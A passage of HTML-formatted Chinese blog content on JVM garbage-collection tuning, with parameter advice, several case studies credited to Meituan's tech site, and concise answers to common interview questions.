class=\"line\">-XX:NewRatio=4  //表示新生代:老年代 = 1:4 即老年代占整个堆的4/5；默认值=2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-6-调整对象晋升至老年代的年龄阈值\"><a href=\"#5-6-调整对象晋升至老年代的年龄阈值\" class=\"headerlink\" title=\"5.6 调整对象晋升至老年代的年龄阈值\"></a>5.6 调整对象晋升至老年代的年龄阈值</h3><ul>\n<li><p>现象：</p>\n<p>老年代频繁进行GC，每次回收大量对象。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>如果对象的晋升年龄较小，新生代中的对象很快就会晋升至老年代，导致老年代中对象数量增多。</p>\n<p>然而，这些对象在接下来的短时间内可能会被回收。为解决老年代空间不足导致的频繁GC问题，可调整对象晋升至老年代的年龄阈值，使对象不那么容易晋升至老年代。</p>\n<p>注意：增加对象晋升年龄可能会导致新生代中对象的停留时间增加，从而增加新生代的GC频率，并且复制大对象可能导致新生代GC的时间延长。</p>\n<p>在调整晋升年龄时，需综合考虑新生代和老年代的GC性能，以获得最优的系统性能平衡。</p>\n<h3 id=\"5-7-调整垃圾回收的触发时机\"><a href=\"#5-7-调整垃圾回收的触发时机\" class=\"headerlink\" title=\"5.7 调整垃圾回收的触发时机\"></a>5.7 调整垃圾回收的触发时机</h3><ul>\n<li><p>现象：</p>\n<p>G1和CMS垃圾收集器在执行垃圾回收时与应用程序的业务线程并发工作。</p>\n<p>在垃圾回收过程中，业务线程可能生成新对象，需预留内存空间以容纳这些新产生的对象。</p>\n<p>若内存空间不足，JVM会暂停所有业务线程（STW）以确保垃圾回收正常进行。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>在进行垃圾回收时，若未预留足够的内存空间供新对象使用，可能导致内存压力过大，从而触发STW。</p>\n<p>通过调整垃圾回收的触发时机来预留足够的内存空间，如可设定在老年代占用达到一定比例时触发垃圾回收。</p>\n<p>这有助于提前释放内存空间，为新对象分配留出足够的空间，从而减少因内存不足而导致的STW情况。</p>\n<p>注意：</p>\n<p>提早触发垃圾回收会增加老年代垃圾回收的频率，这可能导致一些性能开销，如额外的CPU使用和系统停顿时间。</p>\n<p>因此，在调整垃圾回收的触发时机时，需要在性能与内存利用率之间找到恰当的平衡。</p>\n<h3 id=\"5-8-设置符合预期的停顿时间\"><a href=\"#5-8-设置符合预期的停顿时间\" class=\"headerlink\" title=\"5.8 设置符合预期的停顿时间\"></a>5.8 设置符合预期的停顿时间</h3><blockquote>\n<p><strong>现象</strong>： 程序间接性的卡顿 <strong>原因</strong>：如果没有确切的停顿时间设定，垃圾收集器以吞吐量为主，那么垃圾收集时间就会不稳定。 <strong>注意</strong>：不要设置不切实际的停顿时间，单次时间越短也意味着需要更多的GC次数才能回收完原有数量的垃圾.</p>\n</blockquote>\n<p>参数配置：l</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//GC停顿时间，垃圾收集器会尝试用各种手段达到这个时间  </span><br><span class=\"line\">     -XX:MaxGCPauseMillis </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"六：-JVM调优案例和实践\"><a href=\"#六：-JVM调优案例和实践\" class=\"headerlink\" title=\"六： JVM调优案例和实践\"></a>六： JVM调优案例和实践</h2><h3 id=\"案例1：网站流量增加后，网页响应速度变慢\"><a href=\"#案例1：网站流量增加后，网页响应速度变慢\" class=\"headerlink\" title=\"案例1：网站流量增加后，网页响应速度变慢\"></a>案例1：网站流量增加后，网页响应速度变慢</h3><p><strong>问题描述</strong> 在测试环境中，网站速度较快，但一到生产环境就显著变慢。 <strong>问题分析</strong></p>\n<ol>\n<li><p><strong>初步诊断</strong>： 通过使用 <strong>jstat -gc</strong> 指令监控线上JVM的GC活动，发现GC频率和所占时间异常高。这表明频繁的GC正影响业务线程的执行，从而导致页面响应缓慢。</p>\n</li>\n<li><p><strong>内存调整后的问题</strong>： 增加JVM的堆内存从2GB到16GB后，虽然常规请求的处理速度提高，但出现了间歇性的更长时间卡顿。进一步监控发现，虽然Full GC（FGC）的次数不多，但每次的持续时间过长，有时达到几十秒。</p>\n</li>\n<li><p><strong>原因推断</strong>： 增加堆内存后，虽然减少了频繁的垃圾回收，但因为PS+PO垃圾收集器（Parallel Scavenge + Parallel Old）在垃圾标记和收集阶段都需要停止所有工作线程（STW），所以每次GC时业务线程的停顿时间显著增长。</p>\n</li>\n</ol>\n<p><strong>解决方案</strong></p>\n<ol>\n<li><p><strong>调整垃圾收集器</strong>： 服务不稳定的根本问题是垃圾回收过程中的停顿时间过长，由于默认的PS+PO组合垃圾收集器导致。为了解决这一问题，可更换为并发类的收集器，如CMS垃圾收集器。</p>\n</li>\n<li><p><strong>CMS配置优化</strong>： 根据系统运行的实际情况，调整CMS的启动阈值，预设了合理的停顿时间，以确保不会因为内存回收而影响用户的使用体验。</p>\n</li>\n</ol>\n<h3 id=\"案例2：CPU飙升和GC频繁的调优实践\"><a href=\"#案例2：CPU飙升和GC频繁的调优实践\" class=\"headerlink\" title=\"案例2：CPU飙升和GC频繁的调优实践\"></a>案例2：CPU飙升和GC频繁的调优实践</h3><p><strong>问题描述：</strong> 随着在线游戏玩家数量的增加，系统出现CPU飙升和GC频繁的情况，导致游戏体验下降。 <strong>问题分析：</strong> 使用监控工具检查系统的CPU使用情况和GC情况，发现系统在高负载情况下CPU占用过高，且GC频率过于频繁。 <strong>解决方案：</strong></p>\n<ol>\n<li><p><strong>代码优化</strong>：进行代码审查和性能分析，发现并优化存在不必要的循环操作和资源竞争问题，以减少CPU占用。</p>\n</li>\n<li><p><strong>堆内存调整</strong>：增加堆内存大小，减少GC的频率，提高系统的吞吐量和稳定性，确保系统能够应对增加的玩家数量。</p>\n</li>\n<li><p><strong>GC算法调优</strong>：根据系统负载情况和硬件环境，选择合适的GC算法，并调整相应的参数，以减少GC造成的性能损耗。例如，针对大堆内存和高并发情况，可以考虑使用并行GC或G1收集器，并根据具体情况调整相关参数以提升性能。</p>\n</li>\n</ol>\n<h3 id=\"案例3：数据分析平台系统频繁-Full-GC\"><a href=\"#案例3：数据分析平台系统频繁-Full-GC\" class=\"headerlink\" title=\"案例3：数据分析平台系统频繁 Full GC\"></a>案例3：数据分析平台系统频繁 Full GC</h3><p><strong>问题描述：</strong> 数据分析平台对用户在App中的行为进行定时分析统计，但系统频繁发生Full GC，导致页面打开卡顿，影响用户体验。 <strong>问题分析：</strong></p>\n<ol>\n<li><p><strong>CMS GC算法使用</strong>：系统使用CMS（Concurrent Mark-Sweep）GC算法，但频繁的Full GC表明GC调优方面存在问题。</p>\n</li>\n<li><p><strong>Young GC后存活对象进入老年代</strong>：使用jstat命令监控发现，每次Young GC后大约有10%的存活对象进入老年代，这意味着Survivor区空间可能设置过小，导致存活对象在Survivor区放不下而提前进入老年代。</p>\n</li>\n</ol>\n<p><strong>解决方案：</strong></p>\n<ol>\n<li><p><strong>调整Survivor区大小</strong>：增大Survivor区大小，确保其能容纳Young GC后的存活对象，使存活对象能在Survivor区经历多次Young GC达到年龄阈值后才进入老年代。</p>\n</li>\n<li><p><strong>优化存活对象进入老年代的大小</strong>：调整Survivor区大小后，每次Young GC后进入老年代的存活对象稳定在几百KB左右，大大降低了Full GC的频率，提升了系统的稳定性和性能。</p>\n</li>\n</ol>\n<h3 id=\"案例4：内存飙高问题定位\"><a href=\"#案例4：内存飙高问题定位\" class=\"headerlink\" title=\"案例4：内存飙高问题定位\"></a>案例4：内存飙高问题定位</h3><p><strong>问题描述</strong>：在Java进程中，内存飙高，可能是由于大量对象创建或内存泄漏导致的。</p>\n<p>持续的内存飙高可能表明垃圾回收跟不上对象创建速度，或存在内存泄漏导致对象无法回收。 <strong>问题分析：</strong></p>\n<ol>\n<li><strong>观察垃圾回收情况：</strong></li>\n</ol>\n<ul>\n<li><p>使用 <strong>jstat -gc PID 1000</strong> 命令观察GC次数、时间等信息，每隔一秒打印一次。</p>\n</li>\n<li><p>使用 <strong>jmap -histo PID | head -20</strong> 命令查看堆内存占用空间最大的前20个对象类型。</p>\n</li>\n<li><p>如果GC频率高且每次回收的内存空间正常，可能是对象创建速度过快导致内存占用高；如果每次回收的内存很少，可能是内存泄漏。</p>\n</li>\n</ul>\n<ol start=\"3\">\n<li><strong>导出堆内存文件快照：</strong></li>\n</ol>\n<ul>\n<li>使用 <strong>jmap -dump:live,format&#x3D;b,file&#x3D;&#x2F;home&#x2F;myheapdump.hprof PID</strong> 命令将堆内存信息导出到文件，以进一步分析内存占用情况。</li>\n</ul>\n<p><strong>解决方案：</strong> 通过使用VisualVM对dump文件进行离线分析，识别内存占用较高的对象，并进一步定位到创建这些对象的业务代码位置，以便从代码和业务场景中精确定位具体问题。</p>\n<h3 id=\"案例5：Major-GC和Minor-GC频繁\"><a href=\"#案例5：Major-GC和Minor-GC频繁\" class=\"headerlink\" title=\"案例5：Major GC和Minor GC频繁\"></a>案例5：Major GC和Minor GC频繁</h3><p>这个案例，来自美团技术官网</p>\n<h4 id=\"确定目标\"><a href=\"#确定目标\" class=\"headerlink\" title=\"确定目标\"></a>确定目标</h4><p>服务情况：Minor GC每分钟100次 ，Major GC每4分钟一次，单次Minor GC耗时25ms，单次Major GC耗时200ms，接口响应时间50ms。</p>\n<p>由于这个服务要求低延时高可用，结合上文中提到的GC对服务响应时间的影响，计算可知由于Minor GC的发生，12.5%的请求响应时间会增加，其中8.3%的请求响应时间会增加25ms，可见当前GC情况对响应时间影响较大。</p>\n<p><em>（50ms+25ms）× 100次&#x2F;60000ms &#x3D; 12.5%，50ms × 100次&#x2F;60000ms &#x3D; 8.3%</em> 。</p>\n<p>优化目标：降低TP99、TP90时间。</p>\n<h4 id=\"优化\"><a href=\"#优化\" class=\"headerlink\" title=\"优化\"></a>优化</h4><p>首先优化Minor GC频繁问题。通常情况下，由于新生代空间较小，Eden区很快被填满，就会导致频繁Minor GC，因此可以通过增大新生代空间来降低Minor GC的频率。例如在相同的内存分配率的前提下，新生代中的Eden区增加一倍，Minor GC的次数就会减少一半。</p>\n<p>这时很多人有这样的疑问，扩容Eden区虽然可以减少Minor GC的次数，但会增加单次Minor GC时间么？根据上面公式，如果单次Minor GC时间也增加，很难保证最后的优化效果。</p>\n<p>结合下面情况来分析，单次Minor GC时间主要受哪些因素影响？是否和新生代大小存在线性关系？</p>\n<p>首先，单次Minor GC时间由以下两部分组成：T1（扫描新生代）和 T2（复制存活对象到Survivor区）如下图。（注：这里为了简化问题，我们认为T1只扫描新生代判断对象是否存活的时间，其实该阶段还需要扫描部分老年代，后面案例中有详细描述。）</p>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/14.png\"></p>\n<ul>\n<li><p>扩容前：新生代容量为R ，假设对象A的存活时间为750ms，Minor GC间隔500ms，那么本次Minor GC时间&#x3D; T1（扫描新生代R）+T2（复制对象A到S）。</p>\n</li>\n<li><p>扩容后：新生代容量为2R ，对象A的生命周期为750ms，那么Minor GC间隔增加为1000ms，此时Minor GC对象A已不再存活，不需要把它复制到Survivor区，那么本次GC时间 &#x3D; 2 × T1（扫描新生代R），没有T2复制时间。</p>\n</li>\n</ul>\n<p>可见，扩容后，Minor GC时增加了T1（扫描时间），但省去T2（复制对象）的时间，更重要的是对于虚拟机来说，复制对象的成本要远高于扫描成本，所以，单次<strong>Minor GC时间更多取决于GC后存活对象的数量，而非Eden区的大小</strong>。因此如果堆中短期对象很多，那么扩容新生代，单次Minor GC时间不会显著增加。下面需要确认下服务中对象的生命周期分布情况：</p>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/15.png\"><br>通过上图GC日志中两处红色框标记内容可知：</p>\n<ol>\n<li><p>new threshold &#x3D; 2（动态年龄判断，对象的晋升年龄阈值为2），对象仅经历2次Minor GC后就晋升到老年代，这样老年代会迅速被填满，直接导致了频繁的Major GC。</p>\n</li>\n<li><p>Major GC后老年代使用空间为300M+，意味着此时绝大多数(86% &#x3D; 2G&#x2F;2.3G)的对象已经不再存活，也就是说生命周期长的对象占比很小。</p>\n</li>\n</ol>\n<p>由此可见，服务中存在大量短期临时对象，扩容新生代空间后，Minor GC频率降低，对象在新生代得到充分回收，只有生命周期长的对象才进入老年代。这样老年代增速变慢，Major GC频率自然也会降低。</p>\n<h4 id=\"优化结果\"><a href=\"#优化结果\" class=\"headerlink\" title=\"优化结果\"></a>优化结果</h4><p>通过扩容新生代为为原来的三倍，单次Minor GC时间增加小于5ms，频率下降了60%，服务响应时间TP90，TP99都下降了10ms+，服务可用性得到提升。</p>\n<p>调整前：<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/16.png\"><br>调整后：<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/17.png\"></p>\n<h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>如何选择各分区大小应该依赖应用程序中<strong>对象生命周期的分布情况：如果应用存在大量的短期对象，应该选择较大的年轻代；如果存在相对较多的持久对象，老年代应该适当增大。</strong></p>\n<h4 id=\"更多思考\"><a href=\"#更多思考\" class=\"headerlink\" title=\"更多思考\"></a>更多思考</h4><p>关于上文中提到晋升年龄阈值为2，很多同学有疑问，为什么设置了MaxTenuringThreshold&#x3D;15，对象仍然仅经历2次Minor GC，就晋升到老年代？这里涉及到“动态年龄计算”的概念。</p>\n<p><strong>动态年龄计算</strong>：</p>\n<p>Hotspot遍历所有对象时，按照年龄从小到大对其所占用的大小进行累积，当累积的某个年龄大小超过了survivor区的一半时，取这个年龄和MaxTenuringThreshold中更小的一个值，作为新的晋升年龄阈值。在本案例中，调优前：Survivor区 &#x3D; 64M，desired survivor &#x3D; 32M，此时Survivor区中age&lt;&#x3D;2的对象累计大小为41M，41M大于32M，所以晋升年龄阈值被设置为2，下次Minor GC时将年龄超过2的对象被晋升到老年代。</p>\n<p>JVM引入动态年龄计算，主要基于如下两点考虑：</p>\n<ol>\n<li><p>如果固定按照MaxTenuringThreshold设定的阈值作为晋升条件：</p>\n<p>a）MaxTenuringThreshold设置的过大，原本应该晋升的对象一直停留在Survivor区，直到Survivor区溢出，一旦溢出发生，Eden+Svuvivor中对象将不再依据年龄全部提升到老年代，这样对象老化的机制就失效了。</p>\n<p>b）MaxTenuringThreshold设置的过小，“过早晋升”即对象不能在新生代充分被回收，大量短期对象被晋升到老年代，老年代空间迅速增长，引起频繁的Major GC。分代回收失去了意义，严重影响GC性能。</p>\n</li>\n<li><p>相同应用在不同时间的表现不同：特殊任务的执行或者流量成分的变化，都会导致对象的生命周期分布发生波动，那么固定的阈值设定，因为无法动态适应变化，会造成和上面相同的问题。</p>\n</li>\n</ol>\n<p>总结来说，为了更好的适应不同程序的内存情况，虚拟机并不总是要求对象年龄必须达到Maxtenuringthreshhold再晋级老年代。</p>\n<h3 id=\"美团案例6-请求高峰期发生GC，导致服务可用性下降\"><a href=\"#美团案例6-请求高峰期发生GC，导致服务可用性下降\" class=\"headerlink\" title=\"美团案例6: 请求高峰期发生GC，导致服务可用性下降\"></a>美团案例6: 请求高峰期发生GC，导致服务可用性下降</h3><p>这个案例，来自美团技术官网</p>\n<h4 id=\"确定目标-1\"><a href=\"#确定目标-1\" class=\"headerlink\" title=\"确定目标\"></a>确定目标</h4><p>GC日志显示，高峰期CMS在重标记（Remark）阶段耗时1.39s。</p>\n<p>Remark阶段是Stop-The-World（以下简称为STW）的，即在执行垃圾回收时，Java应用程序中除了垃圾回收器线程之外其他所有线程都被挂起，意味着在此期间，用户正常工作的线程全部被暂停下来，这是低延时服务不能接受的。本次优化目标是降低Remark时间。</p>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/18.png\"></p>\n<h4 id=\"优化-1\"><a href=\"#优化-1\" class=\"headerlink\" title=\"优化\"></a>优化</h4><p>解决问题前，先回顾一下CMS的四个主要阶段，以及各个阶段的工作内容。下图展示了CMS各个阶段可以标记的对象，用不同颜色区分。</p>\n<ol>\n<li><p>Init-mark初始标记(STW) ，该阶段进行可达性分析，标记GC ROOT能直接关联到的对象，所以很快。</p>\n</li>\n<li><p>Concurrent-mark并发标记，由前阶段标记过的绿色对象出发，所有可到达的对象都在本阶段中标记。</p>\n</li>\n<li><p>Remark重标记(STW) ，暂停所有用户线程，重新扫描堆中的对象，进行可达性分析，标记活着的对象。因为并发标记阶段是和用户线程并发执行的过程，所以该过程中可能有用户线程修改某些活跃对象的字段，指向了一个未标记过的对象，如下图中红色对象在并发标记开始时不可达，但是并行期间引用发生变化，变为对象可达，这个阶段需要重新标记出此类对象，防止在下一阶段被清理掉，这个过程也是需要STW的。特别需要注意一点，这个阶段是以新生代中对象为根来判断对象是否存活的。</p>\n</li>\n<li><p>并发清理，进行并发的垃圾清理。</p>\n</li>\n</ol>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/19.png\"><br>可见，Remark阶段主要是通过扫描堆来判断对象是否存活。那么准确判断对象是否存活，需要扫描哪些对象？CMS对老年代做回收，Remark阶段仅扫描老年代是否可行？结论是不可行，原因如下：<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/20.png\"><br>如果仅扫描老年代中对象，即以老年代中对象为根，判断对象是否存在引用，上图中，对象A因为引用存在新生代中，它在Remark阶段就不会被修正标记为可达，GC时会被错误回收。</p>\n<p>新生代对象持有老年代中对象的引用，这种情况称为<strong>“跨代引用”</strong>。因它的存在，Remark阶段必须扫描整个堆来判断对象是否存活，包括图中灰色的不可达对象。</p>\n<p>灰色对象已经不可达，但仍然需要扫描的原因：<strong>新生代GC和老年代的GC是各自分开独立进行的</strong>，只有Minor GC时才会使用根搜索算法，标记新生代对象是否可达，也就是说虽然一些对象已经不可达，但在Minor GC发生前不会被标记为不可达，CMS也无法辨认哪些对象存活，只能全堆扫描（新生代+老年代）。</p>\n<p>由此可见堆中对象的数目影响了Remark阶段耗时。 分析GC日志可以得出同样的规律，Remark耗时&gt;500ms时，新生代使用率都在75%以上。这样降低Remark阶段耗时问题转换成如何减少新生代对象数量。</p>\n<p>新生代中对象的特点是“朝生夕灭”，这样如果Remark前执行一次Minor GC，大部分对象就会被回收。</p>\n<p>CMS就采用了这样的方式，在Remark前增加了一个可中断的并发预清理（CMS-concurrent-abortable-preclean），该阶段主要工作仍然是并发标记对象是否存活，只是这个过程可被中断。</p>\n<p>此阶段在Eden区使用超过2M时启动，当然2M是默认的阈值，可以通过参数修改。如果此阶段执行时等到了Minor GC，那么上述灰色对象将被回收，Reamark阶段需要扫描的对象就少了。</p>\n<p>除此之外CMS为了避免这个阶段没有等到Minor GC而陷入无限等待，提供了参数CMSMaxAbortablePrecleanTime ，默认为5s，含义是如果可中断的预清理执行超过5s，不管发没发生Minor GC，都会中止此阶段，进入Remark。</p>\n<p>根据GC日志红色标记2处显示，可中断的并发预清理执行了5.35s，超过了设置的5s被中断，期间没有等到Minor GC ，所以Remark时新生代中仍然有很多对象。</p>\n<p>对于这种情况，CMS提供CMSScavengeBeforeRemark参数，用来保证Remark前强制进行一次Minor GC。</p>\n<h4 id=\"优化结果-1\"><a href=\"#优化结果-1\" class=\"headerlink\" title=\"优化结果\"></a>优化结果</h4><p>经过增加CMSScavengeBeforeRemark参数，单次执行时间&gt;200ms的GC停顿消失，从监控上观察，GCtime和业务波动保持一致，不再有明显的毛刺。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/21.png\"></p>\n<h4 id=\"小结-1\"><a href=\"#小结-1\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>通过案例分析了解到，由于跨代引用的存在，CMS在Remark阶段必须扫描整个堆，同时为了避免扫描时新生代有很多对象，增加了可中断的预清理阶段用来等待Minor GC的发生。只是该阶段有时间限制，如果超时等不到Minor GC，Remark时新生代仍然有很多对象，我们的调优策略是，通过参数强制Remark前进行一次Minor GC，从而降低Remark阶段的时间。</p>\n<h4 id=\"更多思考-1\"><a href=\"#更多思考-1\" class=\"headerlink\" title=\"更多思考\"></a>更多思考</h4><p>案例中只涉及老年代GC，其实新生代GC存在同样的问题，即老年代可能持有新生代对象引用，所以Minor GC时也必须扫描老年代。</p>\n<p><strong>JVM是如何避免Minor GC时扫描全堆的？</strong> 经过统计信息显示，老年代持有新生代对象引用的情况不足1%，根据这一特性JVM引入了卡表（card table）来实现这一目的。如下图所示：</p>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/22.png\"><br><strong>卡表</strong>的具体策略是将老年代的空间分成大小为512B的若干张卡（card）。卡表本身是单字节数组，数组中的每个元素对应着一张卡，当发生老年代引用新生代时，虚拟机将该卡对应的卡表元素设置为适当的值。如上图所示，卡表3被标记为脏（卡表还有另外的作用，标识并发标记阶段哪些块被修改过），之后Minor GC时通过扫描卡表就可以很快的识别哪些卡中存在老年代指向新生代的引用。这样虚拟机通过空间换时间的方式，避免了全堆扫描。</p>\n<p>总结来说，CMS的设计聚焦在获取最短的时延，为此它“不遗余力”地做了很多工作，包括尽量让应用程序和GC线程并发、增加可中断的并发预清理阶段、引入卡表等，虽然这些操作牺牲了一定吞吐量但获得了更短的回收停顿时间。</p>\n<h3 id=\"美团案例7：发生Stop-The-World的GC\"><a href=\"#美团案例7：发生Stop-The-World的GC\" class=\"headerlink\" title=\"美团案例7：发生Stop-The-World的GC\"></a>美团案例7：发生Stop-The-World的GC</h3><p>这个案例，来自美团技术官网</p>\n<h4 id=\"确定目标-2\"><a href=\"#确定目标-2\" class=\"headerlink\" title=\"确定目标\"></a>确定目标</h4><p>GC日志如下图（在GC日志中，Full GC是用来说明这次垃圾回收的停顿类型，代表STW类型的GC，并不特指老年代GC），根据GC日志可知本次Full GC耗时1.23s。这个在线服务同样要求低时延高可用。</p>\n<p>本次优化目标是降低单次STW回收停顿时间，提高可用性。</p>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/23.png\"></p>\n<h4 id=\"优化-2\"><a href=\"#优化-2\" class=\"headerlink\" title=\"优化\"></a>优化</h4><p>首先，什么时候可能会触发STW的Full GC呢？</p>\n<ol>\n<li><p>Perm空间不足；</p>\n</li>\n<li><p>CMS GC时出现promotion failed和concurrent mode failure（concurrent mode failure发生的原因一般是CMS正在进行，但是由于老年代空间不足，需要尽快回收老年代里面的不再被使用的对象，这时停止所有的线程，同时终止CMS，直接进行Serial Old GC）；</p>\n</li>\n<li><p>统计得到的Young GC晋升到老年代的平均大小大于老年代的剩余空间；</p>\n</li>\n<li><p>主动触发Full GC（执行jmap -histo:live [pid]）来避免碎片问题。</p>\n</li>\n</ol>\n<p>然后，我们来逐一分析一下：</p>\n<ul>\n<li><p>排除原因2：如果是原因2中两种情况，日志中会有特殊标识，目前没有。</p>\n</li>\n<li><p>排除原因3：根据GC日志，当时老年代使用量仅为20%，也不存在大于2G的大对象产生。</p>\n</li>\n<li><p>排除原因4：因为当时没有相关命令执行。</p>\n</li>\n<li><p>锁定原因1：根据日志发现Full GC后，Perm区变大了，推断是由于永久代空间不足容量扩展导致的。</p>\n</li>\n</ul>\n<p>找到原因后解决方法有两种：</p>\n<ol>\n<li><p>通过把-XX:PermSize参数和-XX:MaxPermSize设置成一样，强制虚拟机在启动的时候就把永久代的容量固定下来，避免运行时自动扩容。</p>\n</li>\n<li><p>CMS默认情况下不会回收Perm区，通过参数CMSPermGenSweepingEnabled、CMSClassUnloadingEnabled ，可以让CMS在Perm区容量不足时对其回收。</p>\n</li>\n</ol>\n<p>由于该服务没有生成大量动态类，回收Perm区收益不大，所以我们采用方案1，启动时将Perm区大小固定，避免进行动态扩容。</p>\n<h4 id=\"优化结果-2\"><a href=\"#优化结果-2\" class=\"headerlink\" title=\"优化结果\"></a>优化结果</h4><p>调整参数后，服务不再有Perm区扩容导致的STW GC发生。</p>\n<h4 id=\"小结-2\"><a href=\"#小结-2\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>对于性能要求很高的服务，建议将MaxPermSize和MinPermSize设置成一致（JDK8开始，Perm区完全消失，转而使用元空间。而元空间是直接存在内存中，不在JVM中），Xms和Xmx也设置为相同，这样可以减少内存自动扩容和收缩带来的性能损失。虚拟机启动的时候就会把参数中所设定的内存全部化为私有，即使扩容前有一部分内存不会被用户代码用到，这部分内存在虚拟机中被标识为虚拟内存，也不会交给其他进程使用。</p>\n<h2 id=\"八：JVM调优常见面试题的精简答案\"><a href=\"#八：JVM调优常见面试题的精简答案\" class=\"headerlink\" title=\"八：JVM调优常见面试题的精简答案\"></a>八：JVM调优常见面试题的精简答案</h2><h4 id=\"8-1、调优包括哪些维度？\"><a href=\"#8-1、调优包括哪些维度？\" class=\"headerlink\" title=\"8. 1、调优包括哪些维度？\"></a>8. 1、调优包括哪些维度？</h4><p>架构调优、代码调优、JVM调优、数据库调优、操作系统调优等</p>\n<p>架构调优和代码调优是JVM调优的基础，其中<strong>架构调优是对系统影响最大的</strong></p>\n<h4 id=\"8-2、何时进行JVM调优\"><a href=\"#8-2、何时进行JVM调优\" class=\"headerlink\" title=\"8.2、何时进行JVM调优\"></a>8.2、何时进行JVM调优</h4><ul>\n<li><p>Heap内存（老年代）持续上涨达到设置的最大内存值；</p>\n</li>\n<li><p>Full GC 次数频繁；</p>\n</li>\n<li><p>GC 停顿时间过长（超过1秒）；</p>\n</li>\n<li><p>应用出现OutOfMemory等内存异常；</p>\n</li>\n<li><p>应用中有使用本地缓存且占用大量内存空间；</p>\n</li>\n<li><p>系统吞吐量与响应性能不高或不降；</p>\n</li>\n</ul>\n<h4 id=\"8-3、JVM调优的基本原则\"><a href=\"#8-3、JVM调优的基本原则\" class=\"headerlink\" title=\"8.3、JVM调优的基本原则\"></a>8.3、JVM调优的基本原则</h4><ul>\n<li><p>大多数的Java应用不需要进行JVM优化；</p>\n</li>\n<li><p>大多数导致GC问题的原因是代码层面的问题导致的（代码层面）；</p>\n</li>\n<li><p>上线之前，应先考虑将机器的JVM参数设置到最优；</p>\n</li>\n<li><p>减少创建对象的数量（代码层面）；</p>\n</li>\n<li><p>减少使用全局变量和大对象（代码层面）；</p>\n</li>\n<li><p>优先架构调优和代码调优，JVM优化是不得已的手段（代码、架构层面）；</p>\n</li>\n<li><p>分析GC情况优化代码比优化JVM参数更好（代码层面）</p>\n</li>\n</ul>\n<p><strong>其实最有效的优化手段是架构和代码层面的优化，而JVM优化则是最后不得已的手段，也可以说是对服务器配置的最后一次“压榨”</strong></p>\n<h4 id=\"8-4、JVM调优目标\"><a href=\"#8-4、JVM调优目标\" class=\"headerlink\" title=\"8.4、JVM调优目标\"></a>8.4、JVM调优目标</h4><p>目的都是为了令应用程序使用最小的硬件消耗来承载更大的吞吐。JVM调优主要是针对垃圾收集器的收集性能优化，令运行在虚拟机上的应用能够使用更少的内存以及延迟获取更大的吞吐量，总结以下：</p>\n<ul>\n<li><p>延迟：GC低停顿和GC低频率；</p>\n</li>\n<li><p>低内存占用；</p>\n</li>\n<li><p>高吞吐量。</p>\n</li>\n</ul>\n<h4 id=\"8-5、JVM调优量化目标\"><a href=\"#8-5、JVM调优量化目标\" class=\"headerlink\" title=\"8.5、JVM调优量化目标\"></a>8.5、JVM调优量化目标</h4><ul>\n<li><p>Heap 内存使用率 &lt;&#x3D; 70%;</p>\n</li>\n<li><p>Old generation 内存使用率 &lt;&#x3D; 70%;</p>\n</li>\n<li><p>avgpause &lt;&#x3D; 1秒;</p>\n</li>\n<li><p>Full GC 次数 0 或 avg pause interval &gt;&#x3D; 24小时。</p>\n</li>\n</ul>\n<h4 id=\"8-6、JVM调优的步骤\"><a href=\"#8-6、JVM调优的步骤\" class=\"headerlink\" title=\"8.6、JVM调优的步骤\"></a>8.6、JVM调优的步骤</h4><ul>\n<li><p>分析GC日志及dump文件，判断是否需要优化，确定瓶颈问题点；</p>\n</li>\n<li><p>确定JVM调优量化目标；</p>\n</li>\n<li><p>确定JVM调优参数（根据历史JVM参数来调整）；</p>\n</li>\n<li><p>依次调优内存、延迟、吞吐量等指标；</p>\n</li>\n<li><p>对比观察调优前后的差异；</p>\n</li>\n<li><p>不断的分析和调整，直到找到合适的JVM参数配置；</p>\n</li>\n<li><p>找到最合适的参数，将这些参数应用到所有服务器，并进行后续跟踪。</p>\n</li>\n</ul>\n<h4 id=\"8-7、VM参数解析及调优\"><a href=\"#8-7、VM参数解析及调优\" class=\"headerlink\" title=\"8.7、VM参数解析及调优\"></a>8.7、VM参数解析及调优</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\\-Xmx4g   </span><br><span class=\"line\">–Xms4g   </span><br><span class=\"line\">–Xmn1200m   </span><br><span class=\"line\">–Xss512k   </span><br><span class=\"line\">\\-XX:NewRatio=4   </span><br><span class=\"line\">\\-XX:SurvivorRatio=8   </span><br><span class=\"line\">\\-XX:PermSize=100m   </span><br><span class=\"line\">\\-XX:MaxPermSize=256m   </span><br><span class=\"line\">\\-XX:MaxTenuringThreshold=15  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span 